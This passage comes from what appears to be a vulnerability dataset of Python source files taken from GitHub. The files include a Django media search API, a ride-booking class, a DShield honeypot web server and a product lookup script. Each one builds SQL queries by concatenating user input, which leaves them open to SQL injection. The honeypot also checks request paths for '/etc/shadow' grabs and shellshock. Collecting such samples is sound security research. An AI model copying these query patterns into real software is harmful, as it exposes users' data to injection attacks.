Mucua.objects.get(description=DEFAULT_MUCUA)\n        else:\n            try:\n                mucua = Mucua.objects.get(description=mucua)\n            except Mucua.DoesNotExist:\n                mucua = Mucua.objects.get(description=DEFAULT_MUCUA)\n                redirect_page = True\n\n        try:\n            repository = Repository.objects.get(name=repository)\n        except Repository.DoesNotExist:\n            repository = Repository.objects.get(name=DEFAULT_REPOSITORY)\n            redirect_page = True\n\n        # redirect\n        if redirect_page:\n            return HttpResponseRedirect(redirect_base_url + repository.name +\n                                        '/' + mucua.description +\n                                        '/bbx/search/')\n\n        \"\"\"\n        ====================\n        SEARCH ENGINE\n        \n        -------------\n        Sample urls\n        \n        Valid with the following types of url (TODO: create tests):\n        \n        [repository]/[mucua]/search/video/quilombo/limit/5\n        [repository]/[mucua]/search/orderby/note/limit/10\n        [repository]/[mucua]/search/video/quilombo/orderby/title/limit/5\n        [repository]/[mucua]/search/video/quilombo/orderby/type/desc/name/asc/limit/5\n        [repository]/[mucua]/search/video/quilombo/orderby/author/desc\n\n        TODO: still failling when receives incomplete urls. i.e.:\n        [repository]/[mucua]/search/video/quilombo/orderby/title/limit/5\n        \"\"\"\n        \n        \"\"\"  if passed, get limiting rules \"\"\"\n\n        \"\"\" TODO: move default_limit to configurable place \"\"\"\n        default_limit = 20\n        if (args.find('limit') != -1):\n            limiting_str = int(args.split('limit/')[1])\n            args = args.split('limit/')[0]\n        else:\n            limiting_str = default_limit\n        \n        \"\"\" if passed, get ordering rules \"\"\"\n        ordering_str = ''\n        if (args.find('orderby/') != -1):\n            ordering_terms = args.split('orderby/')[1].split('/')\n            ordering_list = []\n            counting = 0\n            for term in ordering_terms:\n                if ((term == 'asc') | (term == 'desc')):\n                    if counting == 0:\n                        continue\n                    ordering_list[-1] += ' ' + term + ' '\n                else:\n                    if (term != ''):\n                        ordering_list.append(term)                               \n                counting += 1\n        \n            ordering_str = ','.join(ordering_list)\n            \n            args = args.split('orderby/')[0]\n        else:\n            ordering_str = 'm.name'\n        \n        \"\"\" compose query string for terms \"\"\"\n        term_str = \"\"\n        args = args.rstrip('/')\n        if args != '':\n            term_index = 0\n            for term in args.split('/'):\n                term = str(term)\n                if (term in [key for (key, type_choice) in getTypeChoices() if\n                            term == type_choice]):\n                    term_str += ' type LIKE \"%' + term + '%\"'\n                elif term in [key for\n                             (key, format_choice) in getFormatChoices() if\n                             term == format_choice]:\n                    term_str += ' format LIKE \"%' + term + '\"%\"'\n                else:\n                    if (term_index > 0):\n                        term_str += 'AND' \n                    \n                    term_str += '( t.name LIKE \"%' + term + '%\"'\n                    term_str += ' OR m.name LIKE \"%' + term + '%\"'\n                    term_str += ' OR m.note LIKE \"%' + term + '%\")'\n                    term_index += 1\n                    \n                    \n        if (len(term_str) > 0):\n            term_str = ' AND (' + term_str + ')'\n        \n        \"\"\" exclude the content of own mucua on the network\n        TODO: maybe create also an option for including or not the own mucua data \"\"\"\n        if (mucua == 'rede'):\n            origin_str = \"origin_id!=\" + str(this_mucua.id)\n        else:\n            origin_str = \"origin_id=\" + str(mucua.id)\n        \n        sql ='SELECT DISTINCT m.* FROM media_media m LEFT JOIN media_media_tags mt ON m.id = mt.media_id LEFT JOIN tag_tag t ON mt.tag_id = t.id  WHERE (%s AND repository_id = %d) %s ORDER BY %s LIMIT %s' % (origin_str, repository.id, term_str, ordering_str, limiting_str)\n        \n        medias = Media.objects.raw(sql)\n        \n        \"\"\" sql log\n        logger.info('sql: ' + sql)\n        \"\"\"\n        \n        # serializa e da saida\n        serializer = MediaSerializer(medias, many=True)\n        return Response(serializer.data)\n\n\n@api_view(['GET', 'PUT', 'DELETE', 'POST'])\ndef media_detail(request, repository, mucua, pk=None, format=None):\n    \"\"\"\n    Retrieve, create, update or delete a media instance.\n    \"\"\"\n\n    # pegando sessao por url\n    redirect_page = False\n\n    try:\n        mucua = Mucua.objects.get(description=mucua)\n    except Mucua.DoesNotExist:\n        mucua = Mucua.objects.get(description=DEFAULT_MUCUA)\n        redirect_page = True\n\n    try:\n        repository = Repository.objects.get(name=repository)\n    except Repository.DoesNotExist:\n        repository = Repository.objects.get(name=DEFAULT_REPOSITORY)\n        redirect_page = True\n\n    # redirect\n    if redirect_page:\n        return HttpResponseRedirect(redirect_base_url + repository.name +\n                                    '/' + mucua.description + '/media/')\n    author = request.user\n\n    if pk:\n        try:\n            media = Media.objects.get(uuid=pk)\n        except Media.DoesNotExist:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n\n    if request.method == 'GET':\n        if pk == '':\n            # acessa para inicializar tela de publicaocao de conteudo / gera\n            # token\n            c = RequestContext(request, {'autoescape': False})\n            c.update(csrf(request))\n            t = Template('{ \"csrftoken\": \"{{ csrf_token  }}\" }')\n            return HttpResponse(t.render(c), mimetype=u'application/json')\n\n        if pk != '':\n            serializer = MediaSerializer(media)\n            return Response(serializer.data)\n\n    elif request.method == 'PUT':\n        if pk == '':\n            return HttpResponseRedirect(\n                redirect_base_url + repository.name + '/' +\n                mucua.description + '/bbx/search')\n        media.name = request.DATA['name']\n        media.note = request.DATA['note']\n        media.type = request.DATA['type']\n        media.license = request.DATA['license']\n        media.date = request.DATA['date']\n\n        media.save()\n        if media.id:\n            tags = request.DATA['tags'].split(',')\n            media.tags.clear()\n            for tag in tags:\n                if tag:\n                    try:\n                        tag = tag.strip()\n                        tag = Tag.objects.get(name=tag)\n                    except Tag.DoesNotExist:\n                        tag = Tag.objects.create(name=tag)\n                        # TODO: case or proximity check to avoid spelling\n                        # errors? Or do people handle this by manual merging &\n                        # deletion of tags?\n                        tag.save()\n\n                    media.tags.add(tag)\n\n            return Response(\"updated media - OK\",\n                            status=status.HTTP_201_CREATED)\n        else:\n            return Response(\"error while creating media\",\n                            status=status.HTTP_400_BAD_REQUEST)\n\n        if serializer.is_valid():\n            serializer.save()\n            return Response(serializer.data)\n        else:\n            return Response(serializer.errors,\n                            status=status.HTTP_400_BAD_REQUEST)\n\n    elif request.method == 'POST':\n        \"\"\"\n        create a new media\n        \"\"\"\n        if request.DATA['author'] != '':\n            author = request.DATA['author']\n        else:\n            author = request.user\n\n        try:\n            author = User.objects.get(username=author)\n        except User.DoesNotExist:\n            author = User.objects.get(username=request.user)\n\n        media = Media(repository=repository,\n                      origin=mucua,\n                      author=author,\n                      name=request.DATA['name'],\n                      note=request.DATA['note'],\n                      type=request.DATA['type'],\n                      format=request.FILES['media_file'].name.split('.')[1].lower(),\n                      license=request.DATA['license'],\n                      date=(request.DATA['date'] if request.DATA['date'] !=\n                            '' else datetime.now()),\n                      media_file=request.FILES['media_file'],\n                      uuid=generate_UUID()\n                      )\n\n        media.save()\n        if media.id:\n            # get tags by list or separated by ','\n            tags = (request.DATA['tags'] if iter(request.DATA['tags'])\n                    else request.DATA['tags'].split(','))\n            for tag_name in tags:\n                try:\n                    if tag_name.find(':') > 0:\n                        args = tag.split(':')\n                        tag_name = args[1]\n                    tag = Tag.objects.get(name=tag_name)\n                except Tag.DoesNotExist:\n                    tag = Tag.objects.create(name=tag_name)\n                    tag.save()\n\n                media.tags.add(tag)\n\n            media.save()  # salva de novo para chamar o post_save\n            serializer = MediaSerializer(media)\n            return Response(serializer.data, status=status.HTTP_201_CREATED)\n        else:\n            return Response(\"error while creating media\",\n                            status=status.HTTP_400_BAD_REQUEST)\n\n    elif request.method == 'DELETE':\n\n        media.delete()\n\n        return Response(status=status.HTTP_204_NO_CONTENT)\n\n\n@api_view(['GET'])\ndef media_last(request, repository, mucua, qtd=5):\n    \"\"\"\n    List the last added medias\n    \"\"\"\n    try:\n        mucua = Mucua.objects.get(description=mucua)\n    except Mucua.DoesNotExist:\n        mucua = Mucua.objects.get(description=DEFAULT_MUCUA)\n\n    try:\n        repository = Repository.objects.get(name=repository)\n    except Repository.DoesNotExist:\n        repository = Repository.objects.get(name=DEFAULT_REPOSITORY)\n\n    medias = Media.objects.filter(\n        repository=repository.id\n    ).filter(origin=mucua.id).order_by('-date')[:qtd]\n    # serializa e da saida\n    serializer = MediaSerializer(medias, many=True)\n    return Response(serializer.data)\n\n\n@api_view(['GET'])\ndef media_by_mocambola(request, repository, mucua, username, qtd=5):\n    if mucua != 'all':\n        try:\n            mucua = Mucua.objects.get(description=mucua)\n        except Mucua.DoesNotExist:\n            mucua = Mucua.objects.get(description=DEFAULT_MUCUA)\n            redirect_page = True\n\n    try:\n        repository = Repository.objects.get(name=repository)\n    except Repository.DoesNotExist:\n        repository = Repository.objects.get(name=DEFAULT_REPOSITORY)\n\n    try:\n        author = User.objects.get(username=username)\n    except User.DoesNotExist:\n        print 'user not exists'\n\n    if mucua != 'all':\n        medias = Media.objects.filter(\n            repository=repository.id\n            ).filter(origin=mucua.id).filter(\n            author=author.id).order_by('-date')[:qtd]\n    else:\n        medias = Media.objects.filter(\n            repository=repository.id\n            ).filter(author=author.id).order_by('-date')[:qtd]\n\n    # serializa e da saida\n    serializer = MediaSerializer(medias, many=True)\n    return Response(serializer.data)\n\n\n@api_view(['GET'])\ndef show_image(request, repository, mucua, uuid, width, height, format_type):\n\n    try:\n        media = Media.objects.get(uuid=uuid)\n    except Media.DoesNotExist:\n        return Response(status=status.HTTP_404_NOT_FOUND)\n\n    print media.media_file\n    image = get_thumbnail(media.media_file, str(width) + 'x' + str(height),\n                          crop='center', quality=99)\n\n    print path.join(image.url)\n    return Response(True)\n\n\n@api_view(['GET'])\ndef media_url(request, repository, mucua, uuid):\n\n    try:\n        media = Media.objects.get(uuid=uuid)\n    except Media.DoesNotExist:\n        return Response(status=status.HTTP_404_NOT_FOUND)\n\n    return Response(media.get_url())\n\n\n@api_view(['GET'])\n@renderer_classes((UnicodeJSONRenderer, BrowsableAPIRenderer))\ndef media_where_is(request, repository, mucua, uuid):\n    \n    try:\n        media = Media.objects.get(uuid=uuid)\n    except Media.DoesNotExist:\n        return Response(status=status.HTTP_404_NOT_FOUND)\n    io = media.where_is()\n    data = json.loads(io)\n    return Response(data)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kenboo98/291-Mini-Project-I/blob/a56609b72f12e983570522fa7677d1c5e6b84523",
        "file_path": "/book_rides/book_rides.py",
        "source": "import sqlite3\n\nclass Error(Exception):\n    pass\nclass InvalidRNOError(Error):\n    pass\nclass InvalidMemberError(Error):\n    pass\nclass InvalidLocationError(Error):\n    pass\n\n\nclass BookRides:\n    def __init__(self, cursor):\n        self.cursor = cursor\n        self.rides = []\n    def find_rides(self, driver):\n        query = '''\n        SELECT r.rno, r.price, r.rdate, r.seats, r.lugDesc, r.src, r.dst, r.driver, r.cno, r.seats-COUNT(b.bno) \n        FROM rides r, bookings b\n        WHERE driver = '{driver}'\n        AND r.rno = b.bno \n        GROUP BY r.rno, r.price, r.rdate, r.seats, r.lugDesc, r.src, r.dst, r.driver, r.cno\n        '''.format(driver = driver)\n\n        self.cursor.execute(query)\n        self.rides = self.cursor.fetchall()\n\n    def display_rides(self, page_num):\n        page = self.rides[page_num*5: min(page_num*5+5, len(self.rides))]\n        for ride in page:\n            print(str(ride[0]) + '.', end='')\n            print(ride)\n        if (page_num*5+5 < len(self.rides)):\n            user_input = input(\"To book a member on a ride, please enter 'b'. To see more rides, please enter 'y'. To exit, press 'e': \")\n            if (user_input == 'y'):\n                self.display_rides(page_num+1)\n        else:\n            user_input = input(\"To book a member on a ride, please enter 'b'. To exit, press 'e': \")\n            if (user_input == 'b'):\n                self.book_ride()\n            else:\n                pass\n             \n\n    # def find_seats_remaining(self, rno):\n    #     query = '''\n    #     SELECT r.seats-COUNT(b.bno) FROM rides r, bookings b \n    #     WHERE r.rno = {rno}\n    #     AND b.rno = {rno}\n    #     '''.format(rno = rno)\n\n    #     self.cursor.execute(query)\n    #     rows = self.cursor.fetchone()\n    #     return int(rows[0])\n\n    def generate_bno(self):\n        query = \"SELECT MAX(bno) FROM bookings\"\n        self.cursor.execute(query)\n        max_bno = self.cursor.fetchone()\n        return int(max_bno[0])+1\n\n    def verify_email(self, member):\n        query = \"SELECT COUNT(email) FROM members WHERE email = '{email}'\".format(email = member)\n        self.cursor.execute(query)\n        result = self.cursor.fetchone()\n        if (int(result[0]) > 0):\n            return True \n        else:\n            return False\n\n    def verify_rno(self, rno):\n        query = \"SELECT COUNT(rno) FROM rides WHERE rno = {rno}\".format(rno = rno)\n        self.cursor.execute(query)\n        result = self.cursor.fetchone()\n        if (int(result[0]) > 0):\n            return True \n        else:\n            return False\n    \n    def verify_location(self, location):\n        return True \n    \n    def book_ride(self):\n\n        try:\n            rno = input(\"Please enter a rno: \")\n            \n            if (not self.verify_rno(rno)):\n                raise InvalidRNOError\n\n            member = input(\"Please enter the email of the member you want to book on the ride: \")\n\n            if (not self.verify_email(member)):\n                raise InvalidMemberError\n\n            pickup = input(\"Please enter pick up location code: \")\n            dropoff = input(\"Please enter pick up location code: \")\n\n            if (not self.verify_location(pickup) or not self.verify_location(dropoff)):\n                raise InvalidLocationError\n\n            if (not self.verify_email(member)):\n                raise InvalidMemberError\n\n            cost = input(\"Please enter the cost for ride: \")\n\n            seats = input(\"Please enter the number of seats for ride: \")\n\n            #if (int(seats) > self.rides[rno]\n\n            #get unique booking number\n            bno = self.generate_bno()\n            \n\n            query = '''INSERT INTO bookings VALUES ({bno}, {member}, {rno}, {cost}, {seats}, {pickup}, {dropoff})\n                    '''.format(bno = bno, member = member, rno = rno, cost = cost, seats = seats, pickup = pickup, dropoff = dropoff)\n            \n            print(query)\n\n        except InvalidRNOError:\n            print(\"Please enter a valid rno\") \n            self.display_rides(1)\n        except InvalidMemberError:\n            print(\"Please enter a valid member email\")\n            self.display_rides(1)\n        except InvalidLocationError:\n            print(\"Please enter a valid pickup and dropoff location code\")\n            self.display_rides(1)\n\n    \n    \n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DShield-ISC/dshield/blob/92be1f69d10090cf7cfc659232935c19963a0f4a",
        "file_path": "/bin/web.py",
        "source": "#!/usr/bin/python\n\nfrom BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer\n#from urlparse import urlparse\nimport os\nimport sqlite3\nimport time\nimport cgi\n#import xml\n# Dev Libraries:\n#import sys\n#import urlparse\n#import ssl\n#import logging\n#import argparse\n#import mimetypes\n#import posixpath\n#import magic\n#from datetime import datetime\n\ntry:\n    from cStringIO import StringIO\nexcept ImportError:\n    from StringIO import StringIO\n\nPORT_NUMBER = 8080\n\n# Global Variables - bummer need to fix :(\n# configure config SQLLite DB and log directory\n#hpconfig = '..'+os.path.sep+'etc'+os.path.sep+'hpotconfig.db'\nlogdir = '..' + os.path.sep + 'log' #not using at this time - but will\nconfig = '..' + os.path.sep + 'DB' + os.path.sep + 'webserver.sqlite' # got a webserver DB and will prolly have honeypot DB for dorks if we have sqlinjection\n#webpath = '..' + os.path.sep + 'srv' + os.path.sep + 'www' + os.path.sep\n\n# check if config database exists\n#code removed - will code default page unless sitecopy has not been run.\ndef build_DB():\n    db_is_new = not os.path.exists(config)\n    if db_is_new:\n            print 'configuration database is not initialized'\n            sys.exit(0)\n\n    # check if log directory exists\n\n    #if not os.path.isdir(logdir):\n    #        print 'log directory does not exist. '+logdir\n    #        sys.exit(0)\n\n    # each time we start, we start a new log file by appending to timestamp to access.log\n    #logfile = logdir+os.path.sep+'access.log.'+str(time.time())\n    # not using above using dB for logging now.\n\n    conn = sqlite3.connect(config)\n    c = conn.cursor()\n\n    #Create's table for request logging.\n    c.execute('''CREATE TABLE IF NOT EXISTS requests\n                (\n                    date text,\n                    address text,\n                    cmd text,\n                    path text,\n                    useragent text,\n                    vers text\n                )\n            ''')\n\n    #Creates table for useragent unique values - RefID will be response RefID\n    c.execute('''CREATE TABLE IF NOT EXISTS useragents\n                (\n                    ID integer primary key,\n                    RefID integer,\n                    useragent text,\n                    CONSTRAINT useragent_unique UNIQUE (useragent)\n                )\n            ''')\n\n    #Creates table for responses based on useragents.RefID will be IndexID\n    c.execute('''CREATE TABLE IF NOT EXISTS responses\n                (\n                    ID integer primary key,\n                    RID integer,\n                    HeaderField text,\n                    dataField text\n                )\n            ''')\n\n    #post logging database\n    c.execute('''CREATE TABLE IF NOT EXISTS posts\n                (\n                    ID integer primary key,\n                    date text,\n                    address text,\n                    cmd text,\n                    path text,\n                    useragent text,\n                    vers text,\n                    formkey text,\n                    formvalue text\n                )\n            ''')\n    c.execute('''CREATE TABLE IF NOT EXISTS files\n                (\n                    ID integer primary key,\n                    RID integer,\n                    filename text,\n                    DATA blob\n                )\n            ''')\n\n\n    conn.commit()\n    conn.close()\n\n#This class will handles any incoming request from\n#the browser\nclass myHandler(BaseHTTPRequestHandler):\n\n    def do_HEAD(self):\n        conn = sqlite3.connect(config)\n        # this will be where response will be figured out based on database query\n        c = conn.cursor()\n        # vars\n        dte = self.date_time_string()\n        cladd = '%s' % self.address_string()\n        cmd = '%s' % self.command\n        path = '%s' % self.path\n        UserAgentString = '%s' % str(self.headers['user-agent'])\n        rvers = '%s' % self.request_version\n        c.execute(\"INSERT INTO requests VALUES('\"+dte+\"','\"+cladd+\"','\"+cmd+\"','\"+path+\"','\"+UserAgentString+\"','\"+rvers+\"')\") # logging\n        try:\n            c.execute(\"INSERT INTO useragents VALUES(NULL,NULL,'\"+UserAgentString+\"')\") # trying to find all the new useragentstrings\n        except sqlite3.IntegrityError:\n            RefID = c.execute(\"SELECT RefID FROM useragents WHERE useragent='\"+UserAgentString+\"'\").fetchone() #get RefID if there is one - should be set in Backend\n            #print(str(RefID[0]))\n            if str(RefID[0]) != \"None\":\n                Resp = c.execute(\"SELECT * FROM responses WHERE RID=\"+str(RefID[0])+\"\").fetchall()\n                #self.send_response(200)\n                #print(Resp[1][3])\n                for i in Resp:\n                    self.send_header(i[2], i[3])\n                #self.send_header(Resp[1][2], Resp[1][3])\n                self.send_header('Date', self.date_time_string(time.time())) # can potentially have multiple if not careful\n                self.end_headers() #iterates through DB - need to make sure vuln pages and this are synced.\n            else:\n                print(\"Useragent: '\"+UserAgentString+\"' needs a custom response.\")  #get RefID if there is one - should be set in Backend\n        except:\n            self.send_response(200)\n            self.end_headers()\n        finally:\n            conn.commit()\n\n\n    def do_GET(self):\n        conn = sqlite3.connect(config)\n        c = conn.cursor() #connect sqlite DB\n        webpath = '..' + os.path.sep + 'srv' + os.path.sep + 'www' + os.path.sep\n        webdirlst = os.listdir(webpath)\n        for i in webdirlst:\n            site = i\n            file_path = os.path.join(webpath, i)\n        dte = self.date_time_string() # date for logs\n        cladd = '%s' % self.address_string() # still trying to resolve - maybe internal DNS in services\n        cmd = '%s' % self.command # same as ubelow\n        path = '%s' % self.path # see below comment\n        try:\n            UserAgentString = '%s' % str(self.headers['user-agent']) #maybe define other source? such as path like below - /etc/shadow needs apache headers\n        except:\n            UserAgentString = \"NULL\"\n\n        rvers = '%s' % self.request_version\n        c.execute(\"INSERT INTO requests VALUES('\"+dte+\"','\"+cladd+\"','\"+cmd+\"','\"+path+\"','\"+UserAgentString+\"','\"+rvers+\"')\")\n\n        try:\n            c.execute(\"INSERT INTO useragents VALUES(NULL,NULL,'\"+UserAgentString+\"')\")\n        except sqlite3.IntegrityError:\n            RefID = c.execute(\"SELECT RefID FROM useragents WHERE useragent='\"+UserAgentString+\"'\").fetchone()\n            #print(str(RefID[0]))\n            if str(RefID[0]) != \"None\":\n                Resp = c.execute(\"SELECT * FROM responses WHERE RID=\"+str(RefID[0])+\"\").fetchall()\n                #self.send_response(200)\n                #print(Resp[1][3])\n                for i in Resp:\n                    self.send_header(i[2], i[3])\n                #self.send_header(Resp[1][2], Resp[1][3])\n                self.send_header('Date', self.date_time_string(time.time()))\n                self.end_headers()\n                print(self.headers)\n            else:\n                print(\"Useragent: '\"+UserAgentString+\"' needs a custom response.\")\n                self.send_response(200)  # OK\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n        except:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n        #going to use xml or DB for this - may even steal some glastopf stuff https://github.com/mushorg/glastopf/tree/master/glastopf\n        if path == \"/etc/shadow*\": #or matches xml page see -  https://github.com/mushorg/glastopf/blob/master/glastopf/requests.xml\n            print(\"trying to grab hashes.\") #display vuln page - probably need to write some matching code\n        elif path == \"/binexecshell\": #maybe both?\n            print(\"shellshock\") #display vuln page - would love to just pipe out cowrie shell, may be a little too ambitious\n        elif webdirlst: #os.path.isfile(file_path):\n            RefID = c.execute(\"SELECT ID FROM sites WHERE site='\" + site + \"'\").fetchone()\n            siteheaders = c.execute(\"SELECT * FROM headers WHERE RID=\" + str(RefID[0]) + \"\").fetchall()\n            for i in siteheaders:\n                self.send_header(i[1], i[2])\n            f = open(file_path)\n            self.wfile.write(f.read())\n            f.close()\n        else: #default\n            message_parts = [\n                '<title>Upload</title>\\\n                <form action=/ method=POST ENCTYPE=multipart/form-data>\\\n                <input type=file name=upfile> <input type=submit value=Upload>\\\n                <fieldset>\\\n                <legend>Form Using GET</legend>\\\n                <form method=\"get\">\\\n                <p>Form: <input type=\"text\" name=\"get_arg1\"></p>\\\n                <p>Enter data: <input type=\"text\" name=\"get_arg2\"></p>\\\n                <input type=\"submit\" value=\"GET Submit\">\\\n                </form>\\\n                </fieldset>\\\n                <p>&nbsp;</p>\\\n                <fieldset>'\n            ]\n            message = '\\r\\n'.join(message_parts)\n            self.wfile.write(message)\n\n        conn.commit()\n        return\n\n    def do_POST(self):\n        conn = sqlite3.connect(config)\n        # Parse the form data posted\n        '''\n        Handle POST requests.\n        '''\n        #logging.debug('POST %s' % (self.path))\n        c = conn.cursor()\n        #try:\n        dte = self.date_time_string()\n        cladd = '%s' % self.address_string()\n        cmd = '%s' % self.command\n        path = '%s' % self.path\n        UserAgentString = '%s' % str(self.headers['user-agent'])\n        rvers = '%s' % self.request_version\n        c.execute(\"INSERT INTO posts VALUES(\"\n                  \"NULL,'\"+dte+\"','\"+cladd+\"','\"+cmd+\"','\"+path+\"','\"+UserAgentString+\"','\"+rvers+\"',NULL,NULL)\"\n                  )\n\n        try:\n            c.execute(\n                \"INSERT INTO useragents VALUES\"\n                    \"(NULL,NULL,'\"+UserAgentString+\"')\"\n            )\n        except sqlite3.IntegrityError:\n            RefID = c.execute(\"SELECT RefID FROM useragents WHERE useragent='\"+UserAgentString+\"'\").fetchone()\n            #print(str(RefID[0]))\n            if str(RefID[0]) != \"None\":\n                Resp = c.execute(\"SELECT * FROM responses WHERE RID=\"+str(RefID[0])+\"\").fetchall()\n                #self.send_response(200)\n                #print(Resp[1][3])\n                for i in Resp:\n                    self.send_header(i[2], i[3])\n                #self.send_header(Resp[1][2], Resp[1][3])\n                self.send_header('Date', self.date_time_string(time.time()))\n                self.end_headers()\n                print(self.headers)\n            else:\n                print(\"Useragent: '\"+UserAgentString+\"' needs a custom response.\")\n                self.send_response(200)  # OK\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n\n\n        # CITATION: http://stackoverflow.com/questions/4233218/python-basehttprequesthandler-post-variables\n        ctype, pdict = cgi.parse_header(self.headers['content-type'])\n        if ctype == 'multipart/form-data':\n            postvars = cgi.parse_multipart(self.rfile, pdict)\n        elif ctype == 'application/x-www-form-urlencoded':\n            length = int(self.headers['content-length'])\n            postvars = cgi.parse_qs(self.rfile.read(length), keep_blank_values=1)\n        else:\n            postvars = {}\n\n        # Get the \"Back\" link.\n        back = self.path if self.path.find('?') < 0 else self.path[:self.path.find('?')]\n\n        # Display the POST variables.\n        self.wfile.write('<html>')\n        self.wfile.write('  <head>')\n        self.wfile.write('    <title>Server POST Response</title>')\n        self.wfile.write('  </head>')\n        self.wfile.write('  <body>')\n        self.wfile.write('    <p>POST variables (%d).</p>' % (len(postvars)))\n\n        if len(postvars):\n            # Write out the POST variables in 3 columns.\n            self.wfile.write('    <table>')\n            self.wfile.write('      <tbody>')\n            i = 0\n            for key in sorted(postvars):\n                i += 1\n                val = postvars[key]\n                if key == \"upfile\":\n                    RefID = c.execute(\"\"\n                                      \"SELECT ID FROM posts \"\n                                      \"WHERE ID=(SELECT MAX(ID)  \"\n                                      \"FROM posts);\").fetchone()\n                    try:\n                        c.execute(\n                        \"INSERT INTO files VALUES(NULL,'\" +\n                            str(RefID[0]) + \"','\" +\n                            key + \"','\" +\n                            val[0] + \"')\"\n                        )\n                    except:\n                        print(\"Need to handle binaries.\")\n                else:\n                    c.execute(\"INSERT INTO posts VALUES(NULL,'\" +\n                              dte + \"','\" +\n                              cladd + \"','\" +\n                              cmd + \"','\" +\n                              path + \"','\" +\n                              UserAgentString + \"','\" +\n                              rvers + \"','\" +\n                              key + \"','\" +\n                              val[0] +\"')\"\n                              )\n                self.wfile.write('        <tr>')\n                self.wfile.write('          <td align=\"right\">%d</td>' % (i))\n                self.wfile.write('          <td align=\"right\">%s</td>' % key)\n                self.wfile.write('          <td align=\"left\">%s</td>' % val[0])\n                self.wfile.write('        </tr>')\n                conn.commit()\n            self.wfile.write('      </tbody>')\n            self.wfile.write('    </table>')\n\n        self.wfile.write('    <p><a href=\"%s\">Back</a></p>' % (back))\n        self.wfile.write('  </body>')\n        self.wfile.write('</html>')\n        return\n\n    def deal_post_data(self):\n        boundary = self.headers.plisttext.split(\"=\")[1]\n        remainbytes = int(self.headers['content-length'])\n        line = self.rfile.readline()\n        remainbytes -= len(line)\n        if not boundary in line:\n            return (False, \"Content NOT begin with boundary\")\n        line = self.rfile.readline()\n        remainbytes -= len(line)\n        fn = re.findall(r'Content-Disposition.*name=\"file\"; filename=\"(.*)\"', line)\n        dir(fn)\n        if not fn:\n            return (False, \"Can't find out file name...\")\n        path = self.translate_path(self.path)\n        fn = os.path.join(path, fn[0])\n        line = self.rfile.readline()\n        remainbytes -= len(line)\n        line = self.rfile.readline()\n        remainbytes -= len(line)\n        try:\n            out = open(fn, 'wb')\n            magic.from_file(out)\n        except IOError:\n            return (False, \"Can't create file to write, do you have permission to write?\")\n\n        preline = self.rfile.readline()\n        remainbytes -= len(preline)\n        while remainbytes > 0:\n            line = self.rfile.readline()\n            remainbytes -= len(line)\n            if boundary in line:\n                preline = preline[0:-1]\n                if preline.endswith('\\r'):\n                    preline = preline[0:-1]\n                out.write(preline)\n                out.close()\n                return (True, \"File '%s' upload success!\" % fn)\n            else:\n                out.write(preline)\n                preline = line\n        return (False, \"Unexpect Ends of data.\")\n\ntry:\n    #Create a web server and define the handler to manage the\n    #incoming request\n    conn = sqlite3.connect(config)\n    build_DB()\n    server = HTTPServer(('', PORT_NUMBER), myHandler)\n    #server.sys_version = 'test'\n\n    print 'Started httpserver on port ' , PORT_NUMBER\n\n    #Wait forever for incoming http requests\n    server.serve_forever()\n\nexcept KeyboardInterrupt:\n    print '^C received, shutting down the web server'\n    server.socket.close()\n    conn.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kmangame0/raspi-telxon/blob/a627ecb3fd30bd2e1e30137b7e498bca48e83e67",
        "file_path": "/Scripts/Controller.py",
        "source": "import sqlite3 as sql\n\nclass DB_Connector:\n\n\tdef __init__(self, *args, **kwargs):\n\n\t\tself.dbStr = \"../Databases/Product.db\"\n\t\tself.table_name = 'products'\n\t\tself.id_column  = 'id'\n\t\tself.column_2   = 'upc'\n\t\tself.column_3   = 'name'\n\t\tself.column_4   = 'image'\n\t\tself.some_upc = \"\"\n\t\tself.result = \"\"\n\n\t\n\tdef fetch_product(self):\n\n\t\tconn = sql.connect(self.dbStr)\n\n\t\tc = conn.cursor()\n\n\t\tc.execute(\"SELECT * FROM {tn} WHERE {upc}={my_upc}\".\\\n\t        format(tn=self.table_name, cn=self.column_2, \n\t        \tupc=self.column_2, my_upc=self.some_upc))\n\t\t\n\t\tresult = c.fetchone()\n\n\t\treturn result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kmangame0/raspi-telxon/blob/a627ecb3fd30bd2e1e30137b7e498bca48e83e67",
        "file_path": "/Scripts/RaspiTelxon.py",
        "source": "import sys\nimport tkinter as tk\nimport Controller as dbc\nfrom PIL import Image, ImageTk\nfrom tkinter import font\n\n\nclass RaspiTelxon(tk.Tk):\n\t\n\tdef __init__(self):\n\t\t\n\t\t#initialize root object\n\t\ttk.Tk.__init__(self)\n\n\t\tself.title(\"Raspi-Telxon\")\n\t\t\n\t\tself.titleFont = font.Font(family='Helvetica', size=24)\n\t\tself.itemFont = font.Font(family='Helvetica', size=18)\n\n\t\t# Self is this instance of Tk IE:- \"root\"\n\t\tcontainer = tk.Frame(self)\n\n\t\tcontainer.pack(side=\"top\", fill=\"both\", expand=True)\n\t\tcontainer.grid_rowconfigure(0, weight=1)\n\t\tcontainer.grid_columnconfigure(0, weight=1)\n\n\t\t# dispatch_dict = {\"SearchPage\" : SearchPage}\n\t\t# self.dispatch_dict = dispatch_dict\n\t\t\n\t\tself.frames = {}\n\t\tself.result = \"\"\n\t\tself.container = container\n\n\t\tfor F in (StartPage, SearchPage):\n\t\t\t\n\t\t\tframe = F(container, self)\n\n\t\t\t#print(F.__name__)\n\n\t\t\tself.frames[F] = frame\n\n\t\t\t#print(self.frames)\n\n\t\t\tframe.grid(row=0, column=0, sticky=\"nsew\")\n\n\t\tself.show_frame(StartPage)\n\n\n\tdef create_frame(self, F):\n\n\t\tnew_frame = SearchPage(self.container, self)\n\n\t\tself.frames[SearchPage] = new_frame\n\n\t\tnew_frame.grid(row=0, column=0, sticky=\"nsew\")\n\n\t\tself.show_frame(new_frame)\n\t\t\n\n\tdef remove_frame(self, frame):\n\t\t\n\t\tprint(\"remove_frame: \" + str(frame))\n\n\t\tself.frames.pop(frame, None)\n\n\tdef show_frame(self, cont):\n\n\t\tframe = self.frames[cont]\n\t\t\n\t\tframe.tkraise()\n\n\t# Just break out the for on line 23 into a function\n\t# Reduce duplicate code\n\tdef 